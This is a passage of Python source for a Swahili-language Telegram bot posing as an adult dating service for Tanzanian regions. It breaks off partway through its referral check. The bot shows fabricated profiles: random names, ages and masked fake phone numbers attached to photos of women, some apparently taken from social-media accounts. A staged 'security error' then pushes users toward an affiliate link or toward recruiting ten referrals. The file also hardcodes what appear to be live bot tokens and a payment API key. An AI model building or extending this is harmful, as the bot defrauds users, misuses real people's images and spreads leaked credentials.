import os
import random
import asyncio
import logging
import requests
from datetime import datetime
from flask import Flask
from threading import Thread

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, ReplyKeyboardRemove, KeyboardButton
)
from telegram.ext import (
    ApplicationBuilder, ContextTypes, CommandHandler,
    CallbackQueryHandler, MessageHandler, filters, ConversationHandler
)

from database import (
    init_db, add_user, add_referral, get_referral_count, get_all_users, 
    get_total_users_count, get_seen_images, add_seen_image, reset_seen_images, save_order
)

# --- TOKENS & CONFIGS ---
MAIN_BOT_TOKEN = "8050903104:AAH0KH4ah-bdLkkNBoW2pMop3FO5-H2DN-4"
ADMIN_BOT_TOKEN = "8900606629:AAFrZXxBockQJSAJ8SqwUid98lNFt3XL4Co"
ADMIN_ID = "8231186202"
CPA_LINK = "https://tinyurl.com/Activebot"
HARAKAPAY_API_KEY = "hpk_29f08857e1613f2df534581540097759168284249880fa85"
HARAKAPAY_BASE_URL = "https://harakapay.net"

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)

WAITING_PHONE = 1

# --- REGIONS LIST & KEYBOARD ---
REGIONS = [
    "Dar es Salaam", "Arusha", "Dodoma", "Geita", "Iringa", "Kagera", "Katavi", "Kigoma", "Kilimanjaro",
    "Lindi", "Manyara", "Mara", "Mbeya", "Morogoro", "Mtwara", "Mwanza", "Njombe", "Pwani", "Rukwa",
    "Ruvuma", "Shinyanga", "Simiyu", "Singida", "Tabora", "Tanga", "Zanzibar"
]

def get_region_keyboard():
    keyboard = []
    for i in range(0, len(REGIONS), 3):
        group = REGIONS[i:i+3]
        keyboard.append([KeyboardButton(region) for region in group])
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

NAMES = [
    "Asha", "Neema", "Amina", "Rehema", "Subira", "Zainabu", "Mariam", "Sophia", "Latifa", "Yasmin",
"Tatu", "Zuhura", "Janet", "Vero", "Happy", "Joyce", "Stella", "Lilian", "Agnes", "Mwanahamis",
"Fatma", "Saida", "Zakia", "Fatuma", "Jamila", "Hadija", "Mariamu", "Salma", "Mwanahawa", "Sharifa",
"Khadija", "Mwanaidi", "Saada", "Zainab", "Mwashamba", "Mwanaisha", "Asia", "Mwamvita", "Mwamini", "Kulthum",
"Mwatima", "Mwashiuya", "Hafsa", "Halima", "Rukia", "Mtumwa", "Muna", "Mwajuma", "Mwaka", "Siti",
"Zulekha", "Sakina", "Mwanne", "Mwajabu", "Batuli", "Vanessa", "Sarah", "Irene", "Diana", "Natasha",
"Linda", "Elizabeth", "Jackline", "Grace", "Naomi", "Brenda", "Judith", "Carol", "Mercy", "Ruth",
"Catherine", "Joan", "Gloria", "Lucy", "Rose", "Florence", "Winnie", "Veronica", "Angel", "Faith",
"Hope", "Nancy", "Sylvia", "Belinda", "Miriam", "Dorcas", "Queen", "Precious", "Rebecca", "Deborah",
"Tina", "Aida", "Flora", "Anita", "Rashida", "Zuleha", "Magreth", "Zaina", "Glory", "Aisha",
"Rahma", "Nuru", "Zawadi", "Imani", "Pendo", "Tumaini", "Samira", "Shamim", "Najma", "Nadia",
"Hawa", "Asma", "Aziza", "Husna", "Inaya", "Iqra", "Jannat", "Khadra", "Laila", "Leila",
"Marwa", "Munira", "Nabila", "Nafisa", "Nasra", "Ruqayya", "Safia", "Safa", "Samia", "Sanaa",
"Shakira", "Shukria", "Sumaya", "Tahira", "Tamima", "Tasneem", "Uzuri", "Warda", "Yumna", "Zahara",
"Zahra", "Zamzam", "Zarina", "Adela", "Adriana", "Alexandra", "Alice", "Amanda", "Amelia", "Amy",
"Andrea", "Angela", "Anna", "Anne", "Ariana", "Ashley", "Audrey", "Barbara", "Bianca", "Brianna",
"Camila", "Chantal", "Charlotte", "Cheryl", "Christina", "Claire", "Clara", "Claudia", "Danielle", "Darlene",
"Delia", "Eleanor", "Elena", "Ella", "Emily", "Emma", "Erica", "Esther", "Eva", "Evelyn",
"Fiona", "Gabriella", "Gemma", "Georgia", "Gillian", "Hannah", "Harriet", "Isabella", "Isabelle", "Jasmine",
"Jennifer", "Jessica", "Jillian", "Josephine", "Julia", "Juliana", "Karen", "Kayla", "Kelly", "Kimberly",
"Kristina", "Laura", "Lauren", "Leah", "Leslie", "Lydia", "Madeline", "Madison", "Maria", "Marina",
"Marissa", "Martha", "Melissa", "Michelle", "Monica", "Morgan", "Natalie", "Nicole", "Olivia", "Pamela",
"Patricia", "Paula", "Rachel", "Rachael", "Rosemary", "Samantha", "Sandra", "Savannah", "Sharon", "Sheila",
"Sonia", "Stephanie", "Susan", "Suzanne", "Tamara", "Teresa", "Theresa", "Tracy", "Valerie", "Victoria",
"Virginia", "Vivian", "Whitney", "Yvonne", "Zoe", "Abigail", "Adeline", "Alicia", "Alisha", "Alma",
"Amber", "Anastasia", "Annette", "April", "Aubrey", "Beatrice", "Beth", "Bethany", "Beverly", "Bonnie",
"Candice", "Caroline", "Cassie", "Cecilia", "Celeste", "Cynthia", "Daisy", "Dakota", "Daphne", "Destiny",
"Elisa", "Elise", "Eliza", "Elsie", "Emilia", "Esme", "Eunice", "Felicia", "Gabrielle", "Giselle",
"Hailey", "Heidi", "Helen", "Isabel", "Jade", "Jamie", "Janelle", "Janice", "Jenna", "Jenny",
"Jocelyn", "Jordan", "Kaitlyn", "Katherine", "Kathleen", "Kendra", "Kiara", "Kylie", "Lara", "Lexi",
"Lola", "Lorraine", "Lucia", "Lucille", "Maggie", "Margaret", "Mariah", "Marilyn", "Maya", "Megan",
"Melanie", "Molly", "Monique", "Myra", "Nadine", "Natalia", "Nathalie", "Nina", "Noelle", "Olive",
"Ophelia", "Paris", "Penelope", "Phoebe", "Priscilla", "Renee", "Rita", "Ruby", "Sabrina", "Sadie",
"Selena", "Serena", "Shanice", "Shannon", "Skylar", "Sophie", "Stacy", "Summer", "Sydney", "Tanya",
"Tara", "Tasha", "Taylor", "Tiffany", "Toni", "Valentina", "Violet", "Vivienne", "Wendy", "Willow",
"Ximena", "Yvette", "Zelda", "Alina", "Amara", "Amani", "Anaya", "Ariel", "Athena", "Bella",
"Brielle", "Carmen", "Celina", "Dalia", "Eliana", "Jada", "Jalia", "Jemima", "Jovina", "Kadija",
"Kibibi", "Koku", "Maimuna", "Malkia", "Maryam", "Maua", "Mboni", "Mchome", "Mgeni", "Minah",
"Mishka", "Mubarak", "Munawwar", "Mwana", "Mwanajuma", "Mwanamisi", "Mwanashujaa", "Mwanatatu", "Mwanahamisi", "Mwanasiti",
"Mwanawema", "Najat", "Nawal", "Nazia", "Pendo", "Riziki", "Sabina", "Sada", "Sadaka", "Safina",
"Safiya", "Salima", "Sausan", "Shanaz", "Shani", "Shukri", "Sumaiya", "Tabitha", "Talia", "Tausi",
"Tunu", "Ummi", "Wema", "Widad", "Yasmeen", "Yasmina", "Zawiya", "Zuleika", "Zubeda", "Zubeda",
"Aaliyah", "Aaliyah", "Afra", "Afiya", "Amani", "Amira", "Anisa", "Arifa", "Arisha", "Asha",
"Asiya", "Aysha", "Bahar", "Basma", "Bushra", "Dina", "Duaa", "Fadila", "Fadhila", "Farida",
"Fauzia", "Furaha", "Habiba", "Hadiya", "Hafsa", "Hasina", "Hawa", "Hidaya", "Humaira", "Ibtisam",
"Ilham", "Inas", "Jameela", "Kawthar", "Khadra", "Lubna", "Mahira", "Malika", "Mariam", "Maysa",
"Munawara", "Muna", "Nabila", "Nadia", "Nasma", "Nawal", "Nayla", "Noor", "Raisa", "Rania",
"Rashida", "Ruqayya", "Sabah", "Sabina", "Sadia", "Sahar", "Salwa", "Sameera", "Samar", "Sara",
"Shazia", "Sherin", "Sumaiya", "Suraya", "Tahani", "Taqwa", "Wajiha", "Yusra", "Zahira", "Zainab",
"Zakia", "Zaynab", "Zohra", "Zulaikha", "Aurelia", "Aurora", "Bella", "Brooklyn", "Carla", "Cassandra",
"Charlene", "Chelsea", "Christina", "Crystal", "Dawn", "Eden", "Elaine", "Elise", "Erin", "Faith",
"Gabriella", "Gemma", "Gina", "Gwendolyn", "Hazel", "Ivy", "Janelle", "Jenna", "Jocelyn", "Kara",
"Karina", "Karla", "Katrina", "Kelsey", "Kendra", "Kiana", "Kristen", "Lana", "Lara", "Layla",
"Lena", "Lillian", "Lindsey", "Lisa", "Loren", "Lucia", "Mackenzie", "Madeline", "Marissa", "Mckenzie",
"Melinda", "Mia", "Mila", "Miranda", "Misty", "Miriam", "Nadia", "Natalia", "Nellie", "Nora",
"Paige", "Penny", "Phoebe", "Raven", "Rebekah", "Riley", "Rosalie", "Rose", "Sasha", "Scarlett",
"Selina", "Shania", "Shelly", "Sierra", "Skye", "Sonia", "Sophie", "Stacey", "Talia", "Tanya",
"Teresa", "Tessa", "Thelma", "Valerie", "Vanessa", "Veronica", "Victoria", "Violet", "Vivian", "Wendy",
"Yolanda", "Zara", "Zoe", "Aaliyah", "Abby", "Addison", "Adriana", "Alana", "Alessandra", "Alexis",
"Allison", "Alondra", "Amaya", "Amber", "Amelia", "Ana", "Angelina", "Annie", "April", "Ariana",
"Bailey", "Bethany", "Blair", "Bridget", "Brittany", "Brooke", "Caitlin", "Cameron", "Carla", "Cassidy",
"Charity", "Christabel", "Cindy", "Courtney", "Danielle", "Debbie", "Denise", "Diana", "Dominique", "Eleanor",
"Elise", "Elizabeth", "Ellen", "Elsa", "Emmanuel", "Erin", "Eva", "Evelyn", "Gabrielle", "Gillian",
"Grace", "Holly", "Isabelle", "Jade", "Jamie", "Jasmine", "Jean", "Joanne", "Josephine", "Joy",
"Karen", "Katherine", "Katie", "Katrina", "Kayla", "Kelsey", "Kim", "Kristine", "Laura", "Leanne",
"Leila", "Lena", "Lillian", "Lisa", "Lorraine", "Louise", "Lucy", "Madeline", "Maggie", "Maria",
"Marie", "Marina", "Martha", "Mary", "Maya", "Melanie", "Melissa", "Michelle", "Mildred", "Miriam",
"Monica", "Naomi", "Natalie", "Nicole", "Nora", "Olivia", "Patricia", "Pauline", "Rachel", "Rebecca",
"Regina", "Renee", "Rita", "Rosemary", "Ruth", "Sally", "Samantha", "Sandra", "Sarah", "Selina",
"Sharon", "Sheila", "Shirley", "Sonia", "Sophia", "Stephanie", "Susan", "Suzanne", "Tania", "Tanya",
"Theresa", "Tina", "Tracy", "Valerie", "Vanessa", "Veronica", "Wendy", "Yvonne", "Zainab", "Zawadi"




]

IMAGES = [
    "https://i.postimg.cc/vm1M8nbg/1791854037257.jpg",
"https://i.postimg.cc/fynkD7PG/1791906305237.jpg",
"https://i.postimg.cc/G2s9WgXM/1791906329014.jpg",
"https://i.postimg.cc/50FjhKs8/1791906348662.jpg",
"https://i.postimg.cc/LsWn0F3Z/1791906353383.jpg",
"https://i.postimg.cc/BvzXwfBn/1791906371572.jpg",
"https://i.postimg.cc/bv5sFf9p/1791906389122.jpg",
"https://i.postimg.cc/hGYf3Rb6/1791906398043.jpg",
"https://i.postimg.cc/FKzYZHcn/1791906408155.jpg",
"https://i.postimg.cc/qvjty3tQ/1791906420123.jpg",
"https://i.postimg.cc/VkDSnCSC/1791906435675.jpg",
"https://i.postimg.cc/MpdcVQcG/1791906509109.jpg",
"https://i.postimg.cc/pL2hmZdH/1791906519102.jpg",
"https://i.postimg.cc/kgn62cgZ/1791906531737.jpg",
"https://i.postimg.cc/jd6nq9tp/1791906554920.jpg",
"https://i.postimg.cc/Prn8jhs1/1791906567161.jpg",
"https://i.postimg.cc/SNLYQ5kz/1791906700847.jpg",
"https://i.postimg.cc/VsCbpvTY/1791907006897.jpg",
"https://i.postimg.cc/KjBkMpLF/1791907063155.jpg",
"https://i.postimg.cc/W41kHnRm/1791907077162.jpg",
"https://i.postimg.cc/pdcFbFRm/1791907110977.jpg",
"https://i.postimg.cc/qv0n8r1r/1791907157738.jpg",
"https://i.postimg.cc/7PGg4mCq/1791907177809.jpg",
"https://i.postimg.cc/TYngL1qg/1791907187355.jpg",
"https://i.postimg.cc/nrD71h8s/1791907232480.jpg",
"https://i.postimg.cc/BvmxSz5g/1791907255159.jpg",
"https://i.postimg.cc/RCyLJ2ky/1791907265005.jpg",
"https://i.postimg.cc/zD6FH9mY/1791907420672.jpg",
"https://i.postimg.cc/k4ZSHKwX/1791907434486.jpg",
"https://i.postimg.cc/xCqHgtvw/1791907438118.jpg",
"https://i.postimg.cc/zfxKn9gn/1791907596816.jpg",
"https://i.postimg.cc/DwdqzWyF/1791907641145.jpg",
"https://i.postimg.cc/xTmvWxwz/1791910862948.jpg",
"https://i.postimg.cc/gkhVfSCY/1791910868033.jpg",
"https://i.postimg.cc/pT1QtgVr/1791910912470.jpg",
"https://i.postimg.cc/T1zrKgD1/1791910946659.jpg",
"https://i.postimg.cc/wvB5Z6pn/1791910964051.jpg",
"https://i.postimg.cc/KjpJY1Z3/1791853362972.jpg",
"https://i.postimg.cc/QCdfsQrD/1791853387431.jpg",
"https://i.postimg.cc/VNXGFsRm/1791853420218.jpg",
"https://i.postimg.cc/RF9PprsG/1791853437567.jpg",
"https://i.postimg.cc/6QCjh6hg/1791853443814.jpg",
"https://i.postimg.cc/RZkpfJc5/1791853514748.jpg",
"https://i.postimg.cc/wTbGqGvZ/1791853572314.jpg",
"https://i.postimg.cc/L60b9bXQ/1791853590912.jpg",
"https://i.postimg.cc/XNLPhJ0G/1791853597063.jpg",
"https://i.postimg.cc/8k4Y35VN/1791853626887.jpg",
"https://i.postimg.cc/zvxPRdkK/1791853632479.jpg",
"https://i.postimg.cc/vBLKG8gJ/1791853652329.jpg",
"https://i.postimg.cc/ydz5q3dZ/1791853657412.jpg",
"https://i.postimg.cc/7LzcQnqs/1791853668145.jpg",
"https://i.postimg.cc/DwHHgM31/1791853710537.jpg",
"https://i.postimg.cc/nhCNqtgZ/1791853718953.jpg",
"https://i.postimg.cc/28js8Wxn/1791853736371.jpg",
"https://i.postimg.cc/5NPZHt7W/1791853769688.jpg",
"https://i.postimg.cc/sDfkDWJ7/1791853788828.jpg",
"https://i.postimg.cc/Y2xcHRYs/1791853824076.jpg",
"https://i.postimg.cc/vBFRQSPZ/1791853832194.jpg",
"https://i.postimg.cc/C1TyF6vZ/1791853857553.jpg",
"https://i.postimg.cc/QMWGZrJc/1791853862653.jpg",
"https://i.postimg.cc/1zNh1Zrw/1791853873837.jpg",
"https://i.postimg.cc/W4QVd44s/1791853893484.jpg",
"https://i.postimg.cc/43rGY3xS/1791853899906.jpg",
"https://i.postimg.cc/jjWKqft4/1791853912049.jpg",
"https://i.postimg.cc/Gmgd1KwL/1791853917098.jpg",
"https://i.postimg.cc/Bv8sZF4T/1791853946091.jpg",
"https://i.postimg.cc/vm1M8nbg/1791854037257.jpg",
"https://i.postimg.cc/JzzMggFd/1791854075161.jpg",
"https://i.postimg.cc/ZKZTP0xb/1791854086618.jpg",
"https://i.postimg.cc/YSX4ZY8R/malay-atz-20261013-0001.webp",
"https://i.postimg.cc/q7pMkqgW/nicklamaar-20261013-0001.jpg",
"https://i.postimg.cc/bvLYdPtZ/tanzania-baddies-20261013-0001.webp",
"https://i.postimg.cc/mrVZh4H4/tanzania-baddies-20261013-0002.webp",
"https://i.postimg.cc/ZqjY0mdT/tanzania-baddies-20261013-0003.webp",
"https://i.postimg.cc/Xv2Zmdxk/tanzanian-girls-20261013-0001.webp",
"https://i.postimg.cc/5tPHTLpm/tanzanian-girls-20261013-0002.webp",
"https://i.postimg.cc/VN7Spn4R/tanzanian-girls-20261013-0003.webp",
"https://i.postimg.cc/tgRZB2dX/tanzanian-girls-20261013-0004.webp",
"https://i.postimg.cc/HLWc6B0D/tanzanian-girls-20261013-0005.webp",
"https://i.postimg.cc/RZLJ1jt4/tanzanian-girls-20261013-0006.webp",
"https://i.postimg.cc/52SQ5ZCD/tanzanian-girls-20261013-0007.webp",
"https://i.postimg.cc/Njk28WXc/tanzanian-girls-20261013-0008.webp",
"https://i.postimg.cc/ht1Q8Hd0/tanzanian-girls-20261013-0009.webp",
"https://i.postimg.cc/52VFCx6g/tanzanian-girls-20261013-0010.webp",
"https://i.postimg.cc/NjcrHg51/tanzanian-girls-20261013-0011.webp",
"https://i.postimg.cc/W1vJk2h6/tanzanian-girls-20261013-0012.webp",
"https://i.postimg.cc/gkRZjwk6/tanzanian-girls-20261013-0013.webp",
"https://i.postimg.cc/MKRQHcKz/tanzanian-girls-20261013-0014.webp",
"https://i.postimg.cc/Qx5TCBxt/tanzanian-girls-20261013-0015.webp",
"https://i.postimg.cc/SN8MRXQB/tanzanian-girls-20261013-0016.webp",
"https://i.postimg.cc/T2BbTjxS/tanzanian-girls-20261013-0017.webp",
"https://i.postimg.cc/gc1hGypS/tanzanian-girls-20261013-0018.webp",
"https://i.postimg.cc/dQgCJRFR/tanzanian-girls-20261013-0019.webp",
"https://i.postimg.cc/pV3jPQvZ/tanzanian-girls-20261013-0020.webp",
"https://i.postimg.cc/xjBm9GQb/tanzanian-girls-20261013-0021.webp",
"https://i.postimg.cc/44YtCLDb/tanzanian-girls-20261013-0022.webp",
"https://i.postimg.cc/HWr5GZqM/tanzanian-girls-20261013-0023.webp",
"https://i.postimg.cc/zDyWmtsb/tanzanian-girls-20261013-0024.webp",
"https://i.postimg.cc/05zmgWTK/tanzanian-girls-20261013-0025.webp",
"https://i.postimg.cc/nM8pNc64/tanzanian-girls-20261013-0026.webp",
"https://i.postimg.cc/14xsb5Ld/tanzanian-girls-20261013-0027.webp",
"https://i.postimg.cc/bdXp4NK3/tanzanian-girls-20261013-0028.webp",
"https://i.postimg.cc/MXkqgKh0/tanzanian-girls-20261013-0029.webp",
"https://i.postimg.cc/Wzqs9JfM/tanzanian-girls-20261013-0030.webp",
"https://i.postimg.cc/brSq62F0/tanzanian-girls-20261013-0031.webp",
"https://i.postimg.cc/brSq62F2/tanzanian-girls-20261013-0032.webp",
"https://i.postimg.cc/j2nR8Jkw/tanzanian-girls-20261013-0033.webp",
"https://i.postimg.cc/yx37fSrN/tanzanian-girls-20261013-0034.webp",
"https://i.postimg.cc/76WxMNXq/tanzanian-girls-20261013-0035.webp",
"https://i.postimg.cc/kGR7jth2/tanzanian-girls-20261013-0036.webp",
"https://i.postimg.cc/d3ZJWTSV/tanzanian-girls-20261013-0037.webp",
"https://i.postimg.cc/pT62YBkt/tanzanian-girls-20261013-0038.webp",
"https://i.postimg.cc/0QB8dCnf/tanzanian-girls-20261013-0039.webp",
"https://i.postimg.cc/cHHxnzRD/tanzanian-girls-20261013-0040.webp",
"https://i.postimg.cc/76WxMN9M/tanzanian-girls-20261013-0041.webp",
"https://i.postimg.cc/W33NkyG7/tanzanian-girls-20261013-0042.webp",
"https://i.postimg.cc/vBBYVKrn/tanzanian-girls-20261013-0043.webp",
"https://i.postimg.cc/TPQ2hxD2/tanzanian-girls-20261013-0044.webp",
"https://i.postimg.cc/RZNcH71L/1791955952445.jpg",
"https://i.postimg.cc/9XLRY4QG/1791955967348.jpg",
"https://i.postimg.cc/sxgBRzwv/1791955976984.jpg",
"https://i.postimg.cc/mkpPLnns/1791955983185.jpg",
"https://i.postimg.cc/CMcBsZx1/1791955992491.jpg",
"https://i.postimg.cc/NM7TcpYv/1791956014142.jpg",
"https://i.postimg.cc/PrrwZWbN/1791906305237.jpg",
"https://i.postimg.cc/Kc5TRqTM/1791906322588.jpg",
"https://i.postimg.cc/wvXm5FGK/1791906329014.jpg",
"https://i.postimg.cc/Y9KFmT8Y/1791906348662.jpg",
"https://i.postimg.cc/fRPmMV9t/1791906353383.jpg",
"https://i.postimg.cc/9Q0y3dr0/1791906371572.jpg",
"https://i.postimg.cc/NfpRPJGC/1791906389122.jpg",
"https://i.postimg.cc/BZ5T2Zrj/1791906398043.jpg",
"https://i.postimg.cc/Wz70VSGL/1791906408155.jpg",
"https://i.postimg.cc/j5PzgRC6/1791906420123.jpg",
"https://i.postimg.cc/s2tY4Mfv/1791906435675.jpg",
"https://i.postimg.cc/fb37dcNg/1791906509109.jpg",
"https://i.postimg.cc/Hkk9YGPg/1791906519102.jpg",
"https://i.postimg.cc/qvvxJfZr/1791906531737.jpg",
"https://i.postimg.cc/QCZqhHvJ/1791906554920.jpg",
"https://i.postimg.cc/prMBRp36/1791906567161.jpg",
"https://i.postimg.cc/5yPWZdR8/1791907077162.jpg",
"https://i.postimg.cc/wvGtHPPb/1791907255159.jpg",
"https://i.postimg.cc/pr3nQ7JC/1791907265005.jpg",
"https://i.postimg.cc/FRWSz1fb/1791907420672.jpg",
"https://i.postimg.cc/dQNRtNrt/1791907434486.jpg",
"https://i.postimg.cc/D0N1jmnF/1791907438118.jpg",
"https://i.postimg.cc/d142C4fH/1791907596816.jpg",
"https://i.postimg.cc/vm7LYQtR/1791907641145.jpg",
"https://i.postimg.cc/mrWyWcMF/1791910862948.jpg",
"https://i.postimg.cc/28JxT9S0/1791910868033.jpg",
"https://i.postimg.cc/0jyCXLS3/1791910912470.jpg",
"https://i.postimg.cc/1tPBwg3t/1791910946659.jpg",
"https://i.postimg.cc/L437CpcL/1791910964051.jpg",
"https://i.postimg.cc/Bv2Nj5sK/1791955464571.jpg",
"https://i.postimg.cc/wBDF15HM/1791955476082.jpg",
"https://i.postimg.cc/MGh2Sm5c/1791955503053.jpg",
"https://i.postimg.cc/zGG1SB3T/1791955538233.jpg",
"https://i.postimg.cc/9QQjtMzT/1791955544324.jpg",
"https://i.postimg.cc/KvFbjQbX/1791955660563.jpg",
"https://i.postimg.cc/mrqRrsLN/1791955667458.jpg",
"https://i.postimg.cc/qMdJn48L/1791955705703.jpg",
"https://i.postimg.cc/zGzqt72G/1791955719859.jpg",
"https://i.postimg.cc/NfYtFbc4/1791955738932.jpg",
"https://i.postimg.cc/JnDr3h66/1791955762693.jpg",
"https://i.postimg.cc/5tfbr3P8/1791955853603.jpg",
"https://i.postimg.cc/2SGSrML1/1791955906479.jpg",
"https://i.postimg.cc/7LXwr2cs/1791955911456.jpg",
"https://i.postimg.cc/266mk5N6/1791955934044.jpg",
"https://i.postimg.cc/fT6b8YnH/1791955942746.jpg",
"https://i.postimg.cc/8CDDJHMP/adji-thiaba-seck-20261014-0001.jpg",
"https://i.postimg.cc/CKYYBNkF/alishaas-20261014-0001.jpg",
"https://i.postimg.cc/y80s85gK/czo-s-bry-20261014-0001.webp",
"https://i.postimg.cc/Gprr8QG2/isthatshamim-20261014-0001.jpg",
"https://i.postimg.cc/VN11rRnm/lil-zuu53-20261014-0001.webp",
"https://i.postimg.cc/DzghqXPZ/malay-atz-20261014-0001.webp",
"https://i.postimg.cc/Pq4HmwQN/malay-atz-20261014-0002.webp",
"https://i.postimg.cc/tgyyZ5Wn/malay-atz-20261014-0003.webp",
"https://i.postimg.cc/bw1pwMG7/nasra-sweetie-20261014-0001.webp",
"https://i.postimg.cc/02T9xxNz/platnumz-elegance-20261014-0001.jpg",
"https://i.postimg.cc/QMss9b5n/sunnylee636-20261014-0001.jpg",
"https://i.postimg.cc/1zPPnHwX/tanga-rahaa-20261014-0002.jpg",
"https://i.postimg.cc/DzghqXPw/tanga2419-20261014-0001.jpg",
"https://i.postimg.cc/L6cmRRsf/tanzania-best-pics-20261014-0001.jpg",
"https://i.postimg.cc/SNBmqqK2/tanzania-best-pics-20261014-0002.jpg",
"https://i.postimg.cc/wTC9HHBt/tanzania-best-pics-20261014-0003.jpg",
"https://i.postimg.cc/sf0V65d9/tanzania-best-pics-20261014-0004.jpg",
]

# --- MAIN BOT HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = str(user.id)
    add_user(user_id, user.username, user.first_name, str(datetime.utcnow()))

    if context.args:
        ref_id = context.args[0]
        if add_referral(ref_id, user_id):
            # Notify referrer in real-time
            try:
                await context.bot.send_message(
                    chat_id=int(ref_id),
                    text="🎉 <b>Taarifa ya Mwaliko!</b>\n\n🔗 Mtu mpya amejiunga kupitia link yako ya mwaliko! Endelea kusambaza upate upendeleo zaidi.",
                    parse_mode="HTML"
                )
            except Exception:
                pass

    await update.message.reply_text(
        "🔞 <b>SYSTEM AGE VERIFICATION</b>\n\n"
        "Huduma hii ni maalum kwa ajili ya watu wazima pekee (18+). Tafadhali thibitisha umri wako kuendelea.\n\n"
        "👇 <b>Chagua hapa chini:</b>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ NDIO, NINA 18+", callback_data="age_yes"),
             InlineKeyboardButton("❌ HAPANA", callback_data="age_no")]
        ])
    )

async def age_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "age_no":
        await query.message.edit_text("❌ Samahani, huwezi kutumia bot hii ikiwa una chini ya miaka 18.")
        return

    load1 = await query.message.edit_text("<i>🔐 Inathibitisha vigezo vya usalama...</i>", parse_mode="HTML")
    await asyncio.sleep(1.2)
    load2 = await load1.edit_text("<i>⚙️ Inasanidi mfumo wa mikoa...</i>", parse_mode="HTML")
    await asyncio.sleep(1.2)
    await load2.delete()

    welcome_text = (
        f"🍑 Mambo <b>{query.from_user.first_name}</b>! Karibu kwenye <b>Tanzania Connection Bot</b> 🔞🇹🇿\n\n"
        "📍 Chagua mkoa wako hapa chini uanze kutafuta Masugar Mummy, Pisi kali, Watoto wa chuo, na Mashangazi sasa hivi! 💃🔥\n"
        "🆓 Huduma ni <b>BURE 100%</b> masaa 24/7!\n\n"
        "👇 <b>Bonyeza mkoa uliopo hapa chini</b> 👇"
    )
    await query.message.reply_text(welcome_text, parse_mode="HTML", reply_markup=get_region_keyboard())

async def region_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    region = update.message.text.strip()
    if region not in REGIONS:
        return

    user_id = str(update.effective_user.id)

    searching = await update.message.reply_text("<i>🔍 Inatafuta data za mkoa wako...</i>", parse_mode="HTML")
    await asyncio.sleep(1.5)
    await searching.delete()

    seen = get_seen_images(user_id)
    available_images = [img for img in IMAGES if img not in seen]
    if not available_images:
        reset_seen_images(user_id)
        available_images = IMAGES

    image_url = random.choice(available_images)
    add_seen_image(user_id, image_url)

    name = random.choice(NAMES)
    age = random.randint(18, 25)
    prefix = random.choice(["07", "06"])
    number = f"<tg-spoiler>{prefix}{random.randint(10,99)}•••{random.randint(10,99)}</tg-spoiler>"

    caption = (
        f"🔥 <b>MPYA NDANI YA {region.upper()}</b> 🔥\n\n"
        f"💋 <b>JINA:</b> {name}\n"
        f"🎂 <b>UMRI:</b> {age} Years\n"
        f"📍 <b>ENEO:</b> {region}\n"
        f"📞 <b>NAMBA YA SIMU:</b> {number}\n"
        f"💎 <b>AINA:</b> Verified Connection\n\n"
        "👇 <b>Bonyeza kitufe hapa chini kuunganishwa nae mara moja</b> 👇"
    )

    # Hide regular region keyboard when showing profile to keep clean UI
    await update.message.reply_photo(
        photo=image_url,
        caption=caption,
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔗 KUONGANISHWA NAE", callback_data="get_connection")],
            [InlineKeyboardButton("🔙 RUDI KWENYE MKOA", callback_data="back_to_regions")]
        ])
    )

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = str(query.from_user.id)

    if query.data == "get_connection":
        # 4-step cinematic italicized loading sequence
        msg = await query.message.reply_text("<i>🔍 Kuchunguza seva za usalama...</i>", parse_mode="HTML")
        await asyncio.sleep(1)
        msg = await msg.edit_text("<i>🔄 Inatafuta data za mtumiaji...</i>", parse_mode="HTML")
        await asyncio.sleep(1)
        msg = await msg.edit_text("<i>🔐 Inapitia mfumo wa uthibitisho...</i>", parse_mode="HTML")
        await asyncio.sleep(1)
        msg = await msg.edit_text("<i>⚠️ Firewall imezuia upatikanaji wa namba...</i>", parse_mode="HTML")
        await asyncio.sleep(1)
        await msg.delete()

        await query.message.reply_text(
            "🛑 <b>SYSTEM SECURITY ERROR [ERR_AUTH_403]</b> 🛑\n\n"
            "Uunganishwaji umesitishwa kwa muda. Ili kulinda faragha ya mhusika, unahitaji kukamilisha uthibitisho wa mfumo kupitia mojawapo ya njia hapa chini 👇",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("✅ ACTIVATION 1", callback_data="activation1"),
                    InlineKeyboardButton("✅ ACTIVATION 2", callback_data="activation2")
                ],
                [InlineKeyboardButton("ACTIVATION 3", callback_data="activation3")],
                [InlineKeyboardButton("🔙 RUDI", callback_data="back")]
            ])
        )
    elif query.data == "activation1":
        await query.message.edit_text(
            "🔐 <b>MAELEZO YA ACTIVATION [1]</b>\n\n"
            "Tafadhali fuata maelezo na maagizo yote yaliyopo kwenye mfumo wa tovuti yetu ili kukamilisha hatua hii kwa usahihi. 🎯",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📥 FUNGUA TOVUTI", url=CPA_LINK)],
                [InlineKeyboardButton("🔙 RUDI", callback_data="back_to_error")]
            ])
        )
    elif query.data == "activation2":
        ref_count = get_referral_count(user_id)
        await query.message.edit_text(
            f"👥 <b>JINSI YA KUFANYA VERIFICATION [2]</b>\n\n"
            f"🔗 <b>Link yako ya Mwaliko:</b>\n<code>https://t.me/connectiontzzbot?start={user_id}</code>\n\n"
            f"⏳ <b>Waliojiunga kupitia wewe:</b> <code>{ref_count}/10</code>\n\n"
            "📢 Sambaza link hii kwenye magroup au kwa marafiki zako ili kujifungua bure!",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 CHEKI IDADI", callback_data="check_refs")],
                [InlineKeyboardButton("🔙 RUDI", callback_data="back_to_error")]
            ])
        )
    elif query.data == "check_refs":
        ref_count = get_referral_count(user_id)
        if ref_count < 10:
            await query.message.reply_text(
